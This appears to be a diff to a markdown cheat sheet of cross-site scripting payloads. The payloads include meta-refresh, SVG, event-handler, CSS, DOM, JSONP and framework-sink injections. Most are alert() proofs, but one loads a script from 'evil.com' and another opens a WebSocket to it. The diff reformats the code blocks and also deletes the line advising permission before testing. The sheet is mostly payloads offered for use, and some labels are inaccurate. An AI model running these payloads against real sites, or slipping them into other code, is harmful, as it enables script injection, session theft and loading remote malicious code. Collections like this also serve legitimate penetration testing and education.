@@ -162,55 +162,51 @@ callbackFunction(<script>alert('XSS')</script>)
 
 Other Techniques
 
-1. Meta Tags:
-```
+Meta Tags:
+```html
 <meta http-equiv="refresh" content="0; url=javascript:alert('XSS');">
 ```
 
-2. Form Action:
-```
+Form Action:
+```html
 <form action="javascript:alert('XSS')">
     <input type="submit" value="Submit">
 </form>
 ```
 
-3. Base64 Encoded:
+Base64 Encoded:
 
- ```data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFBTJyk8L3NjcmlwdD4=```
+ ```base64html
+ data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFBTJyk8L3NjcmlwdD4=
+```
 
 
 CSS Injection Payloads
 
-1. background-image: ``` url("javascript:alert('XSS')")```
-
-
-2. content: ``` url("javascript:alert('XSS')")```
-
+background-image:
+```css
+url("javascript:alert('XSS')")
+```
 
 
 Special Cases
 
-1. PDF:
+PDF:
 
 Embedded JavaScript in PDF files.
 
 
 
-2. SVG:
-```
+SVG:
+```html
 <svg><script>alert('XSS')</script></svg>
 ```
-
-
 
 General Notes
 
 Test each payload contextually; not all payloads will work in every environment.
 
-Ensure you have permission to test any system before attempting any of these payloads.
-
 Understand the context in which each payload is executed (HTML, attribute, JavaScript, etc.).
-
 
 
 ### Advanced XSS techniques and payloads:
@@ -220,92 +216,93 @@ Advanced XSS Techniques
 1. DOM-Based XSS
 
 Exploiting URL Hash:
-```
+
+```javascript
 window.location.hash = "#<script>alert('XSS')</script>";
 ```
 Using document.write:
-```
+```javascript
 <script>document.write('<script>alert("XSS")<\/script>');</script>
 ```
 
-2. Event Handler Injection
+Event Handler Injection
 
 Using onload in Images:
-```
+```html
 <img src="invalid.jpg" onload="alert('XSS')">
 ```
 Mouse Event Manipulation:
-```
+```html
 <div onmouseover="alert('XSS')" style="height:100px; width:100px; background-color:red;"></div>
 ```
 
-3. Contextual XSS
+Contextual XSS
 
 Inline Event Handlers:
-```
+```html
 <button onclick="alert('XSS')">Click Me</button>
 ```
 Data Attributes:
-```
+```html
 <div data-info="<script>alert('XSS')</script>"></div>
 ```
 
-4. JSON-Based Attacks
+JSON-Based Attacks
 
 Exploiting JavaScript Deserialization:
-```
+```json
 {"callback": "alert('XSS')"}
 ```
 Dynamic Script Loading:
-```
+```javascript
 var script = document.createElement('script');
 script.src = "data:text/javascript,alert('XSS')";
 document.body.appendChild(script);
 
 ```
-5. Polyglot Payloads
+Polyglot Payloads
 
 Combining Contexts:
-```
+```html
 <svg><g/onload="alert('XSS')"></g></svg>
 ```
 Using iframe for Escape:
-```
+```javascript
 <iframe src="javascript:alert('XSS')"></iframe>
 ```
 
-6. SVG Injection
+SVG Injection
 
 Embedded JavaScript:
-```
+```javascript
 <svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS')</script></svg>
 ```
 Using feImage for External Resources:
-```
+```javascript
 <svg><image href="data:image/svg+xml,<svg><script>alert('XSS')</script></svg>"/></svg>
 ```
 
-7. CSS-Related XSS
+CSS-Related XSS
 
 CSS Keyframes:
-```
+```css
 @keyframes x { 0% {background: red;} 100% {background: url("javascript:alert('XSS')")}}
 ```
 
-8. Exploiting Frameworks
+Exploiting Frameworks
 
 React (Unescaped HTML):
-```
+```html
 const userInput = "<script>alert('XSS')</script>";
 return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
 ```
 Angular (Bypassing Security):
-```
+```angular
 import { DomSanitizer } from '@angular/platform-browser';
 const sanitizedHtml = this.sanitizer.bypassSecurityTrustHtml("<script>alert('XSS')</script>");
 ```
 
-9. Server-Side Injection
+Server-Side Injection
 
 HTTP Response Splitting:
 
@@ -316,51 +313,51 @@ Cookie Injection:
 
 If cookies are read and output without sanitization:
 
-```
+```javascript
 document.cookie = "mycookie=<script>alert('XSS')</script>";
 ```
 
-10. AJAX and XHR Exploits
+AJAX and XHR Exploits
 
 Loading External Scripts:
-```
+```html
 var script = document.createElement('script');
 script.src = 'http://evil.com/malicious.js';
 document.body.appendChild(script);
 ```
 XSS with JSONP:
-```
+```jsonp
 <script src="http://example.com/callback?data=<script>alert('XSS')</script>"></script>
 ```
 
 Additional Payloads and Scenarios
 
-11. Testing With Special Characters
+Testing With Special Characters
 
 Using Special Characters:
-```
+```javascript
 <script>document.body.innerHTML += '<img src=x onerror=alert("XSS")>'; </script>
 ```
 
-12. Exploiting XML and SOAP
+Exploiting XML and SOAP
 
 XML Injection:
-```
+```xml
 <request><param><script>alert('XSS')</script></param></request>
 ```
 SOAP Payload:
-```
+```html
 <Envelope><Body><script>alert('XSS')</script></Body></Envelope>
 
 ```
-13. Using HTML5 Features
+Using HTML5 Features
 
 WebSockets:
-```
+```html5
 new WebSocket('ws://evil.com?payload=<script>alert("XSS")</script>');
 ```
 Web Workers:
-```
+```html5
 const worker = new Worker('data:text/javascript,alert("XSS")');
 
 ```
